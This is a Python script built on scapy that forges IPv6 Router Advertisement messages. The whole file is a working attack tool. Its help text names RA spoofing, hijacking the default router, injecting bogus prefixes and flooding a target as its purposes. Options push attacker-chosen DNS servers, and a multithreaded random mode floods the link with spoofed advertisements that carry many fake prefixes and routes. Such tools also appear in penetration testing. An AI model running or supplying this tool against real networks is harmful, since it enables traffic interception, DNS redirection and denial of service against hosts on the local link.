#!/usr/bin/python3
import argparse
import logging
import random
import sys
import threading
import netifaces
from netaddr import IPNetwork
from scapy.arch import get_if_hwaddr
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo, ICMPv6NDOptMTU, \
    ICMPv6NDOptRDNSS, ICMPv6NDOptRouteInfo
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sendpfast
from validate_parameters import is_valid_ipv6, is_valid_mac, is_valid_num, mac2ipv6

# Increase the recursion limit when calling Python objects (used when lots of Extension headers - > 300 headers)
sys.setrecursionlimit(10**6)

def main():
    parser = argparse.ArgumentParser(description="Sending arbitrary Router Advertisement message to the specified "
                                                 "target, which can be used for Router Advertisement spoofing attack, "
                                                 "changing default router, creating bogus IPv6 prefix on the link or "
                                                 "flooding the target.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    parser.add_argument("-smac", dest="source_mac", action="store",
                        help="the MAC address of sender (resolved from the interface if skipping)")
    parser.add_argument("-sip", dest="source_ip", action="store", help="the IPv6 address of sender (resolved from the"
                                                                       " interface if skipping)")
    parser.add_argument("-dip", dest="destination_ip", action="store", help="the IPv6 address of destination (ff02::1"
                                                                            " if skipping)")
    parser.add_argument("-M", dest="m_flag", action="store_true", default=False, help="the M flag (Managed Address Configuration)")
    parser.add_argument("-O", dest="o_flag", action="store_true", default=False, help="the O flag (Other Configuration)")
    parser.add_argument("-H", dest="h_flag", action="store_true", default=False, help="the H flag (Home Agent)")
    parser.add_argument("-A", dest="a_flag", action="store_true", default=False, help="the A flag (Address Configuration)")
    parser.add_argument("-prf", dest="preference", action="store", choices=['High', 'Medium', 'Low', 'Reserved'],
                        default='Medium', help="the preference level of default router (set to Medium if skipping)")
    parser.add_argument("-rlft", dest="router_lifetime", action="store", type=int,
                        default=1800, help="the router lifetime in seconds (set to 1800s if skipping)")
    parser.add_argument("-rcht", dest="reachable_time", action="store", type=int,
                        default=30000, help="the router lifetime in milliseconds (set to 30000ms if skipping)")
    parser.add_argument("-rtrt", dest="retrans_timer", type=int, action="store", default=0,
                        help="the retransmission timer in milliseconds (it is set to 0ms when skipping)")
    parser.add_argument("-prefix", dest="prefix_info", action="store", help="the prefix information of router (not "
                                                                            "included when skipping)")
    parser.add_argument("-vlt", dest="valid_lftime", action="store", type=int, default=4294967295, help="the valid lifetime of prefix")
    parser.add_argument("-plt", dest="prefered_lftime", action="store", type=int, default=4294967295, help="the preferred lifetime of prefix")
    parser.add_argument("-rmac", dest="router_mac", action="store", help="the MAC address of the desired router")
    parser.add_argument("-mtu", dest="mtu", action="store", type=int, help="the MTU on the link to router")
    parser.add_argument("-dns", dest="dns", action="store", nargs="+", help="the IPv6 address of DNS server ("
                                                                            "separated by space if more than 1)")
    parser.add_argument("-p", dest="period", type=int, action="store", help="send the RA messages periodically every "
                                                                            "defined seconds")
    parser.add_argument("-f", dest="flood", action="store", choices=['constant', 'random'],
                        help="flood the target with option: sending RA messages using only the defined addresses ("
                             "constant), or sending RA messages with many random addresses and prefixes (random)")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source IPv6 address
    if args.source_ip is None:
        args.source_ip = netifaces.ifaddresses(args.interface)[netifaces.AF_INET6][
            len(netifaces.ifaddresses(args.interface)[netifaces.AF_INET6]) - 1]['addr']
        args.source_ip = args.source_ip.replace("%", '')
        args.source_ip = args.source_ip.replace(args.interface, '')
    if args.source_ip is not None:
        if not is_valid_ipv6(args.source_ip):
            print("---> The given source IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the destination IPv6 address
    if args.destination_ip is None:
        args.destination_ip = "ff02::1"
    if args.destination_ip is not None:
        if not is_valid_ipv6(args.destination_ip):
            print("---> The given destination IPv6 address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the source MAC address
    if args.source_mac is None:
        args.source_mac = get_if_hwaddr(args.interface)
    if args.source_mac is not None:
        if not is_valid_mac(args.source_mac):
            print("---> The given source MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the M flag
    if not args.m_flag:
        args.m_flag = 0
    if args.m_flag:
        args.m_flag = 1

    # Validate the O flag
    if not args.o_flag:
        args.o_flag = 0
    if args.o_flag:
        args.o_flag = 1

    # Validate the H flag
    if not args.h_flag:
        args.h_flag = 0
    if args.h_flag:
        args.h_flag = 1

    # Validate the A flag
    if args.a_flag and args.prefix_info is not None:
        args.a_flag = 1
    if not args.a_flag and args.prefix_info is not None:
        args.a_flag = 0
    if args.a_flag and args.prefix_info is None:
        print("---> A flag can only be set when having the prefix information. Try again!!!")
        sys.exit(1)

    # Validate the preference
    if args.preference == "High":
        args.preference = 1
    if args.preference == "Medium":
        args.preference = 0
    if args.preference == "Low":
        args.preference = 3
    if args.preference == "Reserved":
        args.preference = 2

    # Validate router lifetime
    if args.router_lifetime:
        if not is_valid_num(args.router_lifetime):
            print("---> The given router lifetime is invalid. Try again!!!")
            sys.exit(1)

    # Validate reachable_time
    if args.reachable_time:
        if not is_valid_num(args.reachable_time):
            print("---> The given reachable time is invalid. Try again!!!")
            sys.exit(1)

    # Validate retransmission timer
    if args.retrans_timer:
        if not is_valid_num(args.retrans_timer):
            print("---> The given retransmission timer is invalid. Try again!!!")
            sys.exit(1)

    # Validate the prefix information
    if args.prefix_info is not None:
        if not is_valid_ipv6(args.prefix_info) and not is_valid_ipv6(str(IPNetwork(args.prefix_info).network)):
            print("---> The given prefix information is invalid. Try again!!!")
            sys.exit(1)
        if is_valid_ipv6(str(IPNetwork(args.prefix_info).network)):
            prefix_len = IPNetwork(args.prefix_info).prefixlen
            network = str(IPNetwork(args.prefix_info).network)

    # Validate the valid lifetime of prefix
    if args.valid_lftime is not None:
        if not is_valid_num(args.valid_lftime):
            print("---> The given valid lifetime of prefix is invalid. Try again!!!")
            sys.exit(1)

    # Validate the prefered lifetime of prefix
    if args.prefered_lftime is not None:
        if not is_valid_num(args.prefered_lftime):
            print("---> The given preferred lifetime of prefix is invalid. Try again!!!")
            sys.exit(1)

    # Validate the router MAC address
    if args.router_mac is None:
        args.router_mac = get_if_hwaddr(args.interface)
    if args.router_mac is not None:
        if not is_valid_mac(args.router_mac):
            print("---> The given desired router MAC address is invalid. Try again!!!")
            sys.exit(1)

    # Validate the MTU
    if args.mtu:
        if not is_valid_num(args.mtu):
            print("---> The given MTU is invalid. Try again!!!")
            sys.exit(1)

    # Validate the DNS server
    if args.dns is not None:
        for i in range(len(args.dns)):
            if not is_valid_ipv6(args.dns[i]):
                print("---> The given IPv6 address of DNS server is invalid. Try again!!!")
                sys.exit(1)

    # Validate the period and flood
    if args.period is not None and args.flood is not None:
        print("---> Only one of two options (periodical sending, flooding) can exist. Try again!!!")
        sys.exit(1)
    if args.period is not None:
        if not is_valid_num(args.period):
            print("---> The given number of period is invalid. Try again!!!")
            sys.exit(1)

    # Turning off logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    # Generate the packet
    layer2 = Ether(src=args.source_mac)
    layer3 = IPv6(src=args.source_ip, dst=args.destination_ip)
    RA = ICMPv6ND_RA(prf=args.preference, M=args.m_flag, O=args.o_flag, H=args.h_flag,
                     routerlifetime=args.router_lifetime, reachabletime=args.reachable_time,
                     retranstimer=args.retrans_timer)
    Opt_LLAddr = ICMPv6NDOptSrcLLAddr(lladdr=args.router_mac)
    packet1 = layer2/layer3/RA

    if args.prefix_info is not None:
        Opt_PrefixInfo = ICMPv6NDOptPrefixInfo(prefixlen=prefix_len, A=args.a_flag, prefix=network, validlifetime=args.valid_lftime, preferredlifetime=args.prefered_lftime)
        packet1 /= Opt_PrefixInfo
    if args.mtu is not None:
        Opt_MTU = ICMPv6NDOptMTU(mtu=args.mtu)
        packet1 /= Opt_MTU
    if args.dns is not None:
        Opt_DNS = ICMPv6NDOptRDNSS(dns=args.dns)
        packet1 /= Opt_DNS
    packet1 /= Opt_LLAddr

    if args.period is None and args.flood is None:
        print("Sending Router Advertisement to the destination: " + args.destination_ip)
        sendp(packet1, verbose=False, iface=args.interface)
    if args.period is not None:
        print("Sending Router Advertisement every " + str(args.period) + " second(s) to the destination: " +
              args.destination_ip + " (press Ctrl+C to stop the program).....")
        sendp(packet1, verbose=False, iface=args.interface, inter=args.period, loop=1)
    if args.flood is not None:
        pkt_list = []
        print("Flooding the destination: " + args.destination_ip + " with falsified Router Advertisement messages ("
                                                                   "press Ctrl+C to stop the attack).....")
        if args.flood == "constant":
            for i in range(200):
                pkt_list.append(packet1)
        if args.flood == "random":
            for i in range(100):
                random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                          random.randint(0, 255),
                                                          random.randint(0, 255))
                source_ip = mac2ipv6(random_mac)
                layer2 = Ether(src=random_mac, dst="33:33:00:00:00:01")
                layer3 = IPv6(src=source_ip, dst=args.destination_ip)
                RA = ICMPv6ND_RA(prf=args.preference, M=args.m_flag, O=args.o_flag, H=args.h_flag,
                                 routerlifetime=args.router_lifetime, reachabletime=args.reachable_time,
                                 retranstimer=args.retrans_timer)
                Opt_LLAddr = ICMPv6NDOptSrcLLAddr(lladdr=random_mac)
                packet1 = layer2 / layer3 / RA

                num_prefixRecord = 20
                network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
                network = "2001:dead:" + network + "::"
                Opt_PrefixInfo = ICMPv6NDOptPrefixInfo(prefixlen=64, A=1, prefix=network)
                packet1 /= Opt_PrefixInfo
                for j in range(num_prefixRecord):
                    network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
                    network = "2001:dead:" + network + "::"
                    packet1 /= ICMPv6NDOptPrefixInfo(prefixlen=64, A=1, prefix=network, validlifetime=args.valid_lftime, preferredlifetime=args.prefered_lftime)

                num_routeInfo = 4
                for m in range(num_routeInfo):
                    network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
                    network = "2004:bad:" + network + "::"
                    packet1 /= ICMPv6NDOptRouteInfo(plen=64, prf="High", prefix=network)

                if args.mtu is not None:
                    Opt_MTU = ICMPv6NDOptMTU(mtu=args.mtu)
                    packet1 /= Opt_MTU
                if args.dns is not None:
                    Opt_DNS = ICMPv6NDOptRDNSS(dns=args.dns)
                    packet1 /= Opt_DNS
                packet1 /= Opt_LLAddr
                pkt_list.append(packet1)

        def send_packets(packet, iface):
            try:
                sendpfast(packet, mbps=60000, pps=30000, loop=5000000, iface=iface)
            except KeyboardInterrupt:
                pass

        threads = []
        for i in range(4):
            thread = threading.Thread(target=send_packets, args=(pkt_list, args.interface))
            threads.append(thread)
            thread.start()

        # wait for all threads to complete
        for thread in threads:
            thread.join()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        # If KeyboardInterrupt is raised in the main thread, stop all child threads
        threading.Event().set()
        sys.exit(0)
